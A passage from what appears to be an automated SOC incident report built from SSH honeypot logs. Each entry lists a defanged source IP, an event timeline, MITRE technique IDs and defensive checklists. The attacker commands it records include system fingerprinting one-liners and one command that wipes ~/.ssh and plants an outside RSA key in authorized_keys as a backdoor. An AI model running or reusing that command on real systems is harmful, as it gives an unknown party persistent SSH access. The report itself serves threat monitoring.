| `2026-07-23 17:37:44` | `cowrie.client.version` |
| `2026-07-23 17:37:44` | `cowrie.client.kex` |
| `2026-07-23 17:37:47` | `cowrie.login.success` |
| `2026-07-23 17:37:48` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.74.222[.]124` to AbuseIPDB if not already reported
- [ ] Block `36.74.222[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd2f166f2a9

| Field | Detail |
|---|---|
| **Source IP** | `47.206.63[.]169` |
| **First Seen** | 2026-07-23 17:37 |
| **Last Seen** | 2026-07-23 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:37:57` | `cowrie.session.connect` |
| `2026-07-23 17:37:58` | `cowrie.client.version` |
| `2026-07-23 17:37:58` | `cowrie.client.kex` |
| `2026-07-23 17:38:00` | `cowrie.login.success` |
| `2026-07-23 17:38:00` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.206.63[.]169` to AbuseIPDB if not already reported
- [ ] Block `47.206.63[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-166272e1271d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:38 |
| **Last Seen** | 2026-07-23 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:38:34` | `cowrie.session.connect` |
| `2026-07-23 17:38:34` | `cowrie.client.version` |
| `2026-07-23 17:38:34` | `cowrie.client.kex` |
| `2026-07-23 17:38:34` | `cowrie.login.success` |
| `2026-07-23 17:38:35` | `cowrie.session.params` |
| `2026-07-23 17:38:35` | `cowrie.command.input` |
| `2026-07-23 17:38:35` | `cowrie.log.closed` |
| `2026-07-23 17:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac432f2270e

| Field | Detail |
|---|---|
| **Source IP** | `122.176.21[.]104` |
| **First Seen** | 2026-07-23 17:39 |
| **Last Seen** | 2026-07-23 17:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:39:31` | `cowrie.session.connect` |
| `2026-07-23 17:39:32` | `cowrie.client.version` |
| `2026-07-23 17:39:32` | `cowrie.client.kex` |
| `2026-07-23 17:39:34` | `cowrie.login.success` |
| `2026-07-23 17:39:35` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.21[.]104` to AbuseIPDB if not already reported
- [ ] Block `122.176.21[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdeafdb8c818

| Field | Detail |
|---|---|
| **Source IP** | `61.186.136[.]36` |
| **First Seen** | 2026-07-23 17:39 |
| **Last Seen** | 2026-07-23 17:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:39:40` | `cowrie.session.connect` |
| `2026-07-23 17:39:41` | `cowrie.client.version` |
| `2026-07-23 17:39:41` | `cowrie.client.kex` |
| `2026-07-23 17:39:43` | `cowrie.login.success` |
| `2026-07-23 17:39:44` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.186.136[.]36` to AbuseIPDB if not already reported
- [ ] Block `61.186.136[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bc28b3cce9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:40 |
| **Last Seen** | 2026-07-23 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:40:11` | `cowrie.session.connect` |
| `2026-07-23 17:40:11` | `cowrie.client.version` |
| `2026-07-23 17:40:11` | `cowrie.client.kex` |
| `2026-07-23 17:40:11` | `cowrie.login.success` |
| `2026-07-23 17:40:12` | `cowrie.session.params` |
| `2026-07-23 17:40:12` | `cowrie.command.input` |
| `2026-07-23 17:40:12` | `cowrie.log.closed` |
| `2026-07-23 17:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e25322e6dfb7

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-23 17:40 |
| **Last Seen** | 2026-07-23 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:40:39` | `cowrie.session.connect` |
| `2026-07-23 17:40:39` | `cowrie.client.version` |
| `2026-07-23 17:40:39` | `cowrie.client.kex` |
| `2026-07-23 17:40:40` | `cowrie.login.success` |
| `2026-07-23 17:40:41` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ce865db5987

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-07-23 17:40 |
| **Last Seen** | 2026-07-23 17:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:40:50` | `cowrie.session.connect` |
| `2026-07-23 17:40:51` | `cowrie.client.version` |
| `2026-07-23 17:40:51` | `cowrie.client.kex` |
| `2026-07-23 17:40:53` | `cowrie.login.success` |
| `2026-07-23 17:40:54` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc912f81ba8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:41 |
| **Last Seen** | 2026-07-23 17:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:41:14` | `cowrie.session.connect` |
| `2026-07-23 17:41:15` | `cowrie.client.version` |
| `2026-07-23 17:41:15` | `cowrie.client.kex` |
| `2026-07-23 17:41:17` | `cowrie.login.success` |
| `2026-07-23 17:41:19` | `cowrie.session.params` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.success` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:19` | `cowrie.command.input` |
| `2026-07-23 17:41:20` | `cowrie.log.closed` |
| `2026-07-23 17:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6d9810f7a2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:41 |
| **Last Seen** | 2026-07-23 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:41:45` | `cowrie.session.connect` |
| `2026-07-23 17:41:45` | `cowrie.client.version` |
| `2026-07-23 17:41:46` | `cowrie.client.kex` |
| `2026-07-23 17:41:46` | `cowrie.login.success` |
| `2026-07-23 17:41:47` | `cowrie.session.params` |
| `2026-07-23 17:41:47` | `cowrie.command.input` |
| `2026-07-23 17:41:47` | `cowrie.log.closed` |
| `2026-07-23 17:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40760c66e525

| Field | Detail |
|---|---|
| **Source IP** | `80.15.193[.]156` |
| **First Seen** | 2026-07-23 17:42 |
| **Last Seen** | 2026-07-23 17:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:42:51` | `cowrie.session.connect` |
| `2026-07-23 17:42:51` | `cowrie.client.version` |
| `2026-07-23 17:42:51` | `cowrie.client.kex` |
| `2026-07-23 17:42:51` | `cowrie.login.success` |
| `2026-07-23 17:42:52` | `cowrie.session.params` |
| `2026-07-23 17:42:52` | `cowrie.command.input` |
| `2026-07-23 17:42:52` | `cowrie.command.failed` |
| `2026-07-23 17:42:52` | `cowrie.log.closed` |
| `2026-07-23 17:42:53` | `cowrie.session.params` |
| `2026-07-23 17:42:53` | `cowrie.command.input` |
| `2026-07-23 17:42:53` | `cowrie.session.file_download` |
| `2026-07-23 17:42:53` | `cowrie.log.closed` |
| `2026-07-23 17:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.15.193[.]156` to AbuseIPDB if not already reported
- [ ] Block `80.15.193[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc70d7a644b

| Field | Detail |
|---|---|
| **Source IP** | `80.15.193[.]156` |
| **First Seen** | 2026-07-23 17:42 |
| **Last Seen** | 2026-07-23 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:42:53` | `cowrie.session.connect` |
| `2026-07-23 17:42:53` | `cowrie.client.version` |
| `2026-07-23 17:42:53` | `cowrie.client.kex` |
| `2026-07-23 17:42:54` | `cowrie.login.success` |
| `2026-07-23 17:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.15.193[.]156` to AbuseIPDB if not already reported
- [ ] Block `80.15.193[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c936192883

| Field | Detail |
|---|---|
| **Source IP** | `80.15.193[.]156` |
| **First Seen** | 2026-07-23 17:42 |
| **Last Seen** | 2026-07-23 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:42:54` | `cowrie.session.connect` |
| `2026-07-23 17:42:54` | `cowrie.client.version` |
| `2026-07-23 17:42:54` | `cowrie.client.kex` |
| `2026-07-23 17:42:54` | `cowrie.login.success` |
| `2026-07-23 17:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.15.193[.]156` to AbuseIPDB if not already reported
- [ ] Block `80.15.193[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6086154afc68

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:43 |
| **Last Seen** | 2026-07-23 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:43:24` | `cowrie.session.connect` |
| `2026-07-23 17:43:24` | `cowrie.client.version` |
| `2026-07-23 17:43:24` | `cowrie.client.kex` |
| `2026-07-23 17:43:24` | `cowrie.login.success` |
| `2026-07-23 17:43:25` | `cowrie.session.params` |
| `2026-07-23 17:43:25` | `cowrie.command.input` |
| `2026-07-23 17:43:25` | `cowrie.log.closed` |
| `2026-07-23 17:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908d9c05b8e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:43 |
| **Last Seen** | 2026-07-23 17:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:43:47` | `cowrie.session.connect` |
| `2026-07-23 17:43:47` | `cowrie.client.version` |
| `2026-07-23 17:43:47` | `cowrie.client.kex` |
| `2026-07-23 17:43:49` | `cowrie.login.success` |
| `2026-07-23 17:43:51` | `cowrie.session.params` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.success` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:51` | `cowrie.command.input` |
| `2026-07-23 17:43:52` | `cowrie.log.closed` |
| `2026-07-23 17:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aea2943f462

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:45 |
| **Last Seen** | 2026-07-23 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:45:09` | `cowrie.session.connect` |
| `2026-07-23 17:45:09` | `cowrie.client.version` |
| `2026-07-23 17:45:09` | `cowrie.client.kex` |
| `2026-07-23 17:45:09` | `cowrie.login.success` |
| `2026-07-23 17:45:10` | `cowrie.session.params` |
| `2026-07-23 17:45:10` | `cowrie.command.input` |
| `2026-07-23 17:45:10` | `cowrie.log.closed` |
| `2026-07-23 17:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-227f21a90c3a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:46 |
| **Last Seen** | 2026-07-23 17:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:46:18` | `cowrie.session.connect` |
| `2026-07-23 17:46:18` | `cowrie.client.version` |
| `2026-07-23 17:46:18` | `cowrie.client.kex` |
| `2026-07-23 17:46:20` | `cowrie.login.success` |
| `2026-07-23 17:46:22` | `cowrie.session.params` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.success` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:22` | `cowrie.command.input` |
| `2026-07-23 17:46:23` | `cowrie.log.closed` |
| `2026-07-23 17:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118e62a7e657

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:46 |
| **Last Seen** | 2026-07-23 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:46:50` | `cowrie.session.connect` |
| `2026-07-23 17:46:50` | `cowrie.client.version` |
| `2026-07-23 17:46:50` | `cowrie.client.kex` |
| `2026-07-23 17:46:50` | `cowrie.login.success` |
| `2026-07-23 17:46:51` | `cowrie.session.params` |
| `2026-07-23 17:46:51` | `cowrie.command.input` |
| `2026-07-23 17:46:51` | `cowrie.log.closed` |
| `2026-07-23 17:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0448dd74a125

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-07-23 17:46 |
| **Last Seen** | 2026-07-23 17:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:46:59` | `cowrie.session.connect` |
| `2026-07-23 17:46:59` | `cowrie.client.version` |
| `2026-07-23 17:46:59` | `cowrie.client.kex` |
| `2026-07-23 17:47:02` | `cowrie.login.success` |
| `2026-07-23 17:47:03` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4c0ee4ae32

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:48 |
| **Last Seen** | 2026-07-23 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:48:28` | `cowrie.session.connect` |
| `2026-07-23 17:48:28` | `cowrie.client.version` |
| `2026-07-23 17:48:28` | `cowrie.client.kex` |
| `2026-07-23 17:48:29` | `cowrie.login.success` |
| `2026-07-23 17:48:29` | `cowrie.session.params` |
| `2026-07-23 17:48:29` | `cowrie.command.input` |
| `2026-07-23 17:48:30` | `cowrie.log.closed` |
| `2026-07-23 17:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498482401928

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:48 |
| **Last Seen** | 2026-07-23 17:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:48:42` | `cowrie.session.connect` |
| `2026-07-23 17:48:43` | `cowrie.client.version` |
| `2026-07-23 17:48:43` | `cowrie.client.kex` |
| `2026-07-23 17:48:46` | `cowrie.login.success` |
| `2026-07-23 17:48:48` | `cowrie.session.params` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.success` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:48` | `cowrie.command.input` |
| `2026-07-23 17:48:49` | `cowrie.log.closed` |
| `2026-07-23 17:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
